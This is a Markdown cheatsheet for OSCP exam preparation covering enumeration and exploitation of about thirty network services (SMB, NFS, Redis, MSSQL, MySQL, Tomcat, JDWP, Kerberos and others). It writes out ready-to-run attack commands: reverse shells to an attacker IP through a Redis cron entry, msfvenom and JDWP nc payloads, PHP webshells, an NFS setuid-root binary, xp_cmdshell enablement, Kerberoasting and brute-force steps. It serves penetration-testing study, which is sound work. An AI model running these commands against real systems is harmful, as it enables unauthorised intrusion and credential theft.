# OSCP / OSCP+ Network Service Enumeration & Exploitation Master Cheatsheet

> **Scope**: Enumeration and exploitation of network services on OSCP/OSCP+ targets.
>
> **Official references**: PEN-200 Chapter 6 (Information Gathering) .
>
> **Exam mindset**: Enumerate → validate → exploit in one pass. Every row includes the full chain from discovery to shell.

---

## Master Table

| # | Service / Port | How to Identify | Output Validation | Exploitation Steps (Detailed) | Tool Commands | Priority |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | **Full TCP Port Scan** | `nmap -p- -T4 <target>` | All open TCP ports listed | Build complete attack surface; high ports (8080, 8443, 5985, 1433, 27017, 3306, 6379) are often missed | `nmap -p- -T4 -oA full_tcp <target>` | **High** |
| 2 | **Service Version & Default Scripts** | `nmap -sV -sC -p <ports> <target>` | Version strings, script output | Cross-reference versions with `searchsploit` | `nmap -sV -sC -p 21,22,80,445 <target>` | **High** |
| 3 | **UDP Top Ports** | `nmap -sU --top-ports 20 <target>` | UDP services respond (SNMP 161, DNS 53, TFTP 69) | UDP leaks more info than TCP | `nmap -sU --top-ports 20 -T4 <target>` | Medium |
| 4 | **SMB (139/445)** | `smbclient -L //<target> -N` ; `nmap -p 445 --script smb-enum-shares,smb-enum-users <target>` | `Anonymous login successful` + share list. `IPC$`, `ADMIN$`, custom shares | **Step 1**: Null session: `smbclient -L //<target> -N`. **Step 2**: Connect: `smbclient //<target>/<share> -N`. **Step 3**: Download: `get <file>`. Search `passwords.txt`, `config.*`, `.kdbx`. **Step 4**: Test creds: `nxc smb <target> -u <user> -p <pass>`. **Step 5**: If `Pwn3d!`: `psexec.py <domain>/<user>:<pass>@<target>`. **Step 6**: MS17-010: `nmap --script smb-vuln-ms17-010` → EternalBlue | `smbclient -L //<target> -N` ; `smbclient //<target>/<share> -N` ; `nxc smb <target> -u <user> -p <pass> --shares` ; `psexec.py <domain>/<user>:<pass>@<target>` | **High** |
| 5 | **RPC / rpcclient (111)** | `rpcinfo -p <target>` ; `rpcclient -U "" -N <target>` | `enumdomusers` returns domain users. `srvinfo` returns host info | **Step 1**: `rpcclient -U "" -N <target>`. **Step 2**: `enumdomusers`. **Step 3**: `enumdomgroups`. **Step 4**: `querydominfo`. **Step 5**: Build userlist for spraying/AS-REP | `rpcclient -U "" -N <target>` → `enumdomusers` ; `srvinfo` ; `netshareenumall` | **High** |
| 6 | **NFS (2049)** | `showmount -e <target>` ; `nmap -p 2049 --script nfs-showmount,nfs-ls <target>` | Export list with `no_root_squash` or `*` | **Step 1**: `showmount -e <target>`. **Step 2**: `mkdir /mnt/nfs && mount -t nfs <target>:/share /mnt/nfs -o nolock`. **Step 3**: If `no_root_squash`: `echo 'int main(){setuid(0);system("/bin/bash");}' > /mnt/nfs/x.c && gcc /mnt/nfs/x.c -o /mnt/nfs/x && chmod +s /mnt/nfs/x`. **Step 4**: On target: `/share/x` → root | `showmount -e <target>` ; `mount -t nfs <target>:/share /mnt/nfs -o nolock` ; `gcc /mnt/nfs/x.c -o /mnt/nfs/x && chmod +s /mnt/nfs/x` | **High** |
| 7 | **FTP (21)** | `nmap -p 21 --script ftp-anon,ftp-vsftpd-backdoor <target>` ; `ftp <target>` | `Anonymous FTP login allowed`. `vsftpd 2.3.4` = backdoor | **Step 1**: `ftp <target>` → `anonymous:anonymous`. **Step 2**: `ls` → `wget -r ftp://anonymous:anonymous@<target>/`. **Step 3**: Check write: `put test.txt`. If FTP root = web root, `put shell.php`. **Step 4**: `vsftpd 2.3.4`: `nc <target> 6200`. **Step 5**: Credentials → SSH/WinRM | `ftp <target>` ; `wget -r ftp://anonymous:anonymous@<target>/` ; `searchsploit vsftpd 2.3.4` | **High** |
| 8 | **SSH (22)** | `nmap -p 22 -sV <target>` ; `nc <target> 22` | Version string (`OpenSSH 7.2p2`) | **Step 1**: Version grab. **Step 2**: `searchsploit openssh <version>`. **Step 3**: Use found credentials/keys: `ssh -i id_rsa <user>@<target>`. **Step 4**: Do not brute-force | `nmap -p 22 -sV <target>` ; `searchsploit openssh <version>` | Medium |
| 9 | **SMTP (25/465/587)** | `nmap -p 25 --script smtp-commands,smtp-enum-users <target>` ; `nc -nv <target> 25` | `VRFY`/`EXPN`/`RCPT` available. Valid usernames returned | **Step 1**: `nc -nv <target> 25`. **Step 2**: `VRFY admin` → `250` = exists. **Step 3**: `smtp-user-enum -M VRFY -U users.txt -t <target>`. **Step 4**: Build userlist → spray: `nxc smb <target> -u users.txt -p 'Welcome1' --continue-on-success` | `nc -nv <target> 25` → `VRFY username` ; `smtp-user-enum -M VRFY -U users.txt -t <target>` | **High** |
| 10 | **SNMP (161 UDP)** | `nmap -sU -p 161 --script snmp-brute <target>` ; `onesixtyone -c community.txt <target>` | Community string `public` works. `snmpwalk` returns info | **Step 1**: `onesixtyone` → community. **Step 2**: `snmpwalk -v2c -c public <target>`. **Step 3**: Processes: `snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2`. **Step 4**: Users: `snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25`. **Step 5**: Software: `snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2` | `snmpwalk -v2c -c public <target>` ; `snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2` | **High** |
| 11 | **DNS (53)** | `nmap -p 53 --script dns-zone-transfer <target>` ; `dig axfr @<target> <domain>` | Zone transfer succeeds → all records | **Step 1**: `dig axfr @<target> <domain>`. **Step 2**: Add hostnames to `/etc/hosts`. **Step 3**: Enumerate subdomains: `dnsrecon -d <domain> -n <target> -t axfr` | `dig axfr @<target> <domain>` ; `dnsrecon -d <domain> -n <target> -t axfr` | **High** |
| 12 | **HTTP/HTTPS (80/443/8080/8443)** | `nmap -p 80,443 --script http-title,http-headers <target>` ; `whatweb <target>` | Page title, headers, common paths | **Step 1**: `whatweb http://<target>`. **Step 2**: `feroxbuster -u http://<target>`. **Step 3**: `nikto -h http://<target>`. **Step 4**: Pivot to Web Application checklist | `whatweb http://<target>` ; `feroxbuster -u http://<target>` ; `nikto -h http://<target>` | **High** |
| 13 | **LDAP (389/636)** | `ldapsearch -x -H ldap://<target> -s base` | `namingContexts:` returned | **Step 1**: `ldapsearch -x -H ldap://<target> -s base namingcontexts`. **Step 2**: `ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"`. **Step 3**: Extract `sAMAccountName`. **Step 4**: AS-REP: `impacket-GetNPUsers <domain>/ -dc-ip <target> -usersfile users.txt -no-pass`. **Step 5**: Kerberoast: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <target> -request` | `ldapsearch -x -H ldap://<target> -s base namingcontexts` ; `impacket-GetNPUsers <domain>/ -dc-ip <target> -usersfile users.txt -no-pass` | **High** |
| 14 | **Kerberos (88)** | `nmap -p 88 -sV <target>` ; `kerbrute userenum -d <domain> --dc <target> users.txt` | Port 88 = DC. Valid usernames | **Step 1**: `kerbrute userenum -d <domain> --dc <target> users.txt`. **Step 2**: AS-REP: `impacket-GetNPUsers <domain>/ -dc-ip <target> -usersfile valid.txt -no-pass`. **Step 3**: `hashcat -m 18200 asrep.txt rockyou.txt`. **Step 4**: Kerberoast: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <target> -request`. **Step 5**: `hashcat -m 13100 kerb.txt rockyou.txt` | `kerbrute userenum -d <domain> --dc <target> users.txt` ; `impacket-GetNPUsers <domain>/ -dc-ip <target> -usersfile users.txt -no-pass` ; `hashcat -m 18200 asrep.txt rockyou.txt` | **High** |
| 15 | **MSSQL (1433)** | `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password <target>` | Version/instance. `sa` blank password | **Step 1**: `impacket-mssqlclient <domain>/<user>:<pass>@<target> -windows-auth`. **Step 2**: `SELECT IS_SRVROLEMEMBER('sysadmin');`. **Step 3**: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`. **Step 4**: `EXEC xp_cmdshell 'whoami';`. **Step 5**: Reverse shell via `powershell -c IEX(...)` | `impacket-mssqlclient <domain>/<user>:<pass>@<target> -windows-auth` ; `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` ; `EXEC xp_cmdshell 'whoami';` | **High** |
| 16 | **MySQL (3306)** | `nmap -p 3306 --script mysql-info,mysql-empty-password <target>` | Version string. Empty root password | **Step 1**: `mysql -h <target> -u root`. **Step 2**: `hydra -l root -P rockyou.txt <target> mysql`. **Step 3**: `show databases; use <db>; show tables; select * from users;`. **Step 4**: `select user,authentication_string from mysql.user;`. **Step 5**: If FILE: `select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php';` | `mysql -h <target> -u root -p<pass> -e "show databases;"` ; `hydra -l root -P rockyou.txt <target> mysql` | **High** |
| 17 | **Redis (6379)** | `redis-cli -h <target>` → `INFO` | Connects without auth. `CONFIG GET *` works | **Step 1**: `redis-cli -h <target>`. **Step 2**: `INFO`. **Step 3**: Webshell: `CONFIG SET dir /var/www/html` → `CONFIG SET dbfilename shell.php` → `SET x "<?php system(\$_GET['cmd']); ?>"` → `SAVE`. **Step 4**: SSH: `CONFIG SET dir /root/.ssh` → `CONFIG SET dbfilename authorized_keys` → `SET x "\n\nssh-rsa AAAA...\n\n"` → `SAVE`. **Step 5**: Cron: `CONFIG SET dir /var/spool/cron` → `CONFIG SET dbfilename root` → `SET x "\n* * * * * bash -i >& /dev/tcp/<KALI_IP>/443 0>&1\n"` → `SAVE` | `redis-cli -h <target> INFO` ; `CONFIG SET dir /var/www/html` ; `CONFIG SET dbfilename shell.php` ; `SET x "<?php system(\$_GET['cmd']); ?>"` ; `SAVE` | **High** |
| 18 | **WinRM (5985/5986)** | `nmap -p 5985 -sV <target>` ; `nxc winrm <target> -u <user> -p <pass>` | `Pwn3d!` = valid creds | **Step 1**: `nxc winrm <target> -u <user> -p <pass>`. **Step 2**: `evil-winrm -i <target> -u <user> -p '<pass>'`. **Step 3**: Hash: `evil-winrm -i <target> -u <user> -H <NTLM>`. **Step 4**: `whoami /priv` → SeImpersonate → PrintSpoofer | `evil-winrm -i <target> -u <user> -p '<pass>'` ; `evil-winrm -i <target> -u <user> -H <NTLM>` | **High** |
| 19 | **RDP (3389)** | `nmap -p 3389 -sV <target>` ; `nxc rdp <target> -u <user> -p <pass>` | Port open. Credentials valid | **Step 1**: `nxc rdp <target> -u <user> -p <pass>`. **Step 2**: `xfreerdp /u:<user> /p:<pass> /v:<target>` | `xfreerdp /u:<user> /p:<pass> /v:<target>` | Medium |
| 20 | **Rsync (873)** | `nc -vn <target> 873` ; `nmap -sV --script rsync-list-modules -p 873 <target>` | Modules listed. Writable module | **Step 1**: `nmap -sV --script rsync-list-modules -p 873 <target>`. **Step 2**: `rsync -av rsync://<target>/<module> ./loot`. **Step 3**: Upload key: `rsync -av id_rsa.pub rsync://<target>/<module>/authorized_keys`. **Step 4**: `ssh -i id_rsa <user>@<target>` | `rsync -av rsync://<target>/<module> ./loot` ; `rsync -av id_rsa.pub rsync://<target>/<module>/authorized_keys` | Medium |
| 21 | **TFTP (69 UDP)** | `nmap -sU -p 69 --script tftp-enum <target>` | Files enumerated. Anonymous read/write | **Step 1**: `nmap -sU -p 69 --script tftp-enum <target>`. **Step 2**: `tftp <target>` → `get <file>`. **Step 3**: `put shell.php` if writable | `tftp <target>` → `get <file>` ; `nmap -sU -p 69 --script tftp-enum <target>` | Medium |
| 22 | **Telnet (23)** | `nmap -p 23 -sV <target>` ; `telnet <target>` | Banner shows OS/service | **Step 1**: `telnet <target>`. **Step 2**: Default creds. **Step 3**: `searchsploit <service> <version>` | `telnet <target>` ; `searchsploit <service> <version>` | Medium |
| 23 | **Finger (79)** | `nmap -p 79 -sV <target>` ; `finger @<target>` | User list returned | **Step 1**: `finger @<target>`. **Step 2**: Build userlist for spraying | `finger @<target>` ; `finger <user>@<target>` | Low |
| 24 | **POP3 (110/995)** | `nc -nv <target> 110` ; `nmap -p 110 --script pop3-capabilities <target>` | `+OK ... POP3 server`. `CAPA` lists capabilities | **Step 1**: `nc -nv <target> 110`. **Step 2**: `CAPA`. **Step 3**: `USER <user>` → `PASS <pass>`. **Step 4**: `STAT` → `LIST`. **Step 5**: `RETR 1`. **Step 6**: `hydra -l <user> -P rockyou.txt <target> pop3 -V`. **Step 7**: Reuse creds | `nc -nv <target> 110` → `USER admin` → `PASS pass` → `LIST` → `RETR 1` ; `hydra -l <user> -P rockyou.txt <target> pop3 -V` | Medium |
| 25 | **IMAP (143/993)** | `nc -nv <target> 143` ; `nmap -p 143 --script imap-capabilities <target>` | `* OK ... IMAP4rev1`. `CAPABILITY` lists auth mechanisms | **Step 1**: `nc -nv <target> 143`. **Step 2**: `a1 CAPABILITY`. **Step 3**: `a2 LOGIN <user> <pass>`. **Step 4**: `a3 LIST "" "*"`. **Step 5**: `a4 SELECT INBOX`. **Step 6**: `a5 FETCH 1 BODY[]`. **Step 7**: `a6 SEARCH SUBJECT "password"`. **Step 8**: `hydra -l <user> -P rockyou.txt <target> imap -V` | `nc -nv <target> 143` → `a1 LOGIN admin pass` → `a2 LIST "" "*"` → `a3 SELECT INBOX` → `a4 FETCH 1 BODY[]` ; `hydra -l <user> -P rockyou.txt <target> imap -V` | Medium |
| 26 | **MongoDB (27017)** | `nmap -p 27017 -sV <target>` ; `mongo <target>:27017` | No auth. `show dbs` works | **Step 1**: `mongo <target>:27017`. **Step 2**: `show dbs`. **Step 3**: `use admin` → `db.system.users.find()`. **Step 4**: Dump application data | `mongo <target>:27017` → `show dbs` → `db.system.users.find()` | Medium |
| 27 | **Tomcat / Jenkins (8080/8443)** | `whatweb http://<target>:8080` ; `nmap -p 8080 --script http-title <target>` | Tomcat manager page. Default creds `tomcat:tomcat` | **Step 1**: `whatweb http://<target>:8080`. **Step 2**: `tomcat:tomcat` / `admin:admin`. **Step 3**: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f war -o shell.war`. **Step 4**: Deploy via `/manager/html` | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f war -o shell.war` | **High** |
| 28 | **JDWP (localhost/non-standard)** | After foothold: `ss -ntlpu` → internal listener. Tunnel via Ligolo. `nmap -sV -p <port> <tunnel_IP>` | `nmap` identifies `JDWP` | **Step 1**: `ss -ntlpu`. **Step 2**: Ligolo tunnel. **Step 3**: `nmap -sV -p <port> <tunnel_IP>`. **Step 4**: `python2 jdwp-shellifier.py -t <tunnel_IP> -p <port> --cmd "busybox nc <KALI_IP> 4444 -e /bin/bash"`. **Step 5**: `nc -lvnp 4444` | `ss -ntlpu` ; `python2 jdwp-shellifier.py -t <tunnel_IP> -p <port> --cmd "busybox nc <KALI_IP> 4444 -e /bin/bash"` | **High** |
| 29 | **Automated Enumeration** | `autorecon <target>` ; `nmapAutomator.sh -H <target> -t All` | Full scan + script results | Run after manual enumeration to catch missed findings | `autorecon <target>` | **High** |

---

## Quick Command Reference

| Purpose | Command |
| :--- | :--- |
| Full TCP scan | `nmap -p- -T4 -oA full_tcp <target>` |
| Version + scripts | `nmap -sV -sC -p <ports> <target>` |
| UDP top ports | `nmap -sU --top-ports 20 <target>` |
| SMB null session | `smbclient -L //<target> -N` |
| SMB share download | `smbclient //<target>/<share> -N` → `get <file>` |
| SMB admin check | `nxc smb <target> -u <user> -p <pass>` |
| SMB psexec | `psexec.py <domain>/<user>:<pass>@<target>` |
| RPC user dump | `rpcclient -U "" -N <target>` → `enumdomusers` |
| NFS mount | `mount -t nfs <target>:/share /mnt -o nolock` |
| NFS SUID exploit | `gcc /mnt/x.c -o /mnt/x && chmod +s /mnt/x` |
| FTP anonymous | `ftp <target>` (anonymous:anonymous) |
| FTP recursive download | `wget -r ftp://anonymous:anonymous@<target>/` |
| SSH version | `nmap -p 22 -sV <target>` |
| SMTP VRFY | `nc -nv <target> 25` → `VRFY admin` |
| SMTP user enum | `smtp-user-enum -M VRFY -U users.txt -t <target>` |
| SNMP walk | `snmpwalk -v2c -c public <target>` |
| SNMP processes | `snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2` |
| DNS zone transfer | `dig axfr @<target> <domain>` |
| HTTP fingerprint | `whatweb http://<target>` |
| Directory brute-force | `feroxbuster -u http://<target>` |
| LDAP base query | `ldapsearch -x -H ldap://<target> -s base namingcontexts` |
| Kerberos user enum | `kerbrute userenum -d <domain> --dc <target> users.txt` |
| MSSQL connect | `impacket-mssqlclient <domain>/<user>:<pass>@<target> -windows-auth` |
| MSSQL xp_cmdshell | `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';` |
| MySQL connect | `mysql -h <target> -u root -p<pass> -e "show databases;"` |
| MySQL brute-force | `hydra -l root -P rockyou.txt <target> mysql` |
| Redis webshell | `CONFIG SET dir /var/www/html` ; `CONFIG SET dbfilename shell.php` ; `SET x "<?php system(\$_GET['cmd']); ?>"` ; `SAVE` |
| Redis SSH key | `CONFIG SET dir /root/.ssh` ; `CONFIG SET dbfilename authorized_keys` ; `SET x "\n\nssh-rsa AAAA...\n\n"` ; `SAVE` |
| WinRM shell | `evil-winrm -i <target> -u <user> -p '<pass>'` |
| RDP connect | `xfreerdp /u:<user> /p:<pass> /v:<target>` |
| Rsync sync | `rsync -av rsync://<target>/<module> ./loot` |
| TFTP download | `tftp <target>` → `get <file>` |
| Telnet banner | `telnet <target>` |
| Finger users | `finger @<target>` |
| POP3 banner | `nc -nv <target> 110` |
| POP3 login | `USER <user>` → `PASS <pass>` → `LIST` → `RETR 1` |
| POP3 brute-force | `hydra -l <user> -P rockyou.txt <target> pop3 -V` |
| IMAP banner | `nc -nv <target> 143` |
| IMAP login | `a1 LOGIN <user> <pass>` → `a2 LIST "" "*"` → `a3 SELECT INBOX` → `a4 FETCH 1 BODY[]` |
| IMAP brute-force | `hydra -l <user> -P rockyou.txt <target> imap -V` |
| MongoDB dump | `mongo <target>:27017` → `show dbs` → `db.system.users.find()` |
| Tomcat WAR deploy | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f war -o shell.war` |
| JDWP exploit | `python2 jdwp-shellifier.py -t <tunnel_IP> -p <port> --cmd "busybox nc <KALI_IP> 4444 -e /bin/bash"` |
| Automated recon | `autorecon <target>` |

---

## Exam Rules (Enumeration & Exploitation)

- **Nmap is allowed**. Use `-p-`, `-sV`, `-sC` as baseline.
- **Metasploit auxiliary scanners** count toward the one-target restriction. Prefer standalone tools for enumeration.
- **Manual exploitation preferred**: sqlmap and automated exploit tools are restricted; modify public PoCs manually.
- **Credentials feed forward**: Every username, share, or version must be tested against other services (SSH, WinRM, web login, SMB, MySQL, MSSQL).
- **POP3/IMAP are cleartext** on 110/143 — check for `STLS`/`STARTTLS` before assuming encryption.

---

## GitHub Usage Tips

1. Save as `OSCP-Network-Service-Enumeration-Exploitation.md`
2. Keep `\|` escapes in Markdown tables
3. Branch per practice target (e.g., `git checkout -b htb-blue`)
4. Pair with Web Application and AD checklists—enumeration findings feed directly into those attack chains
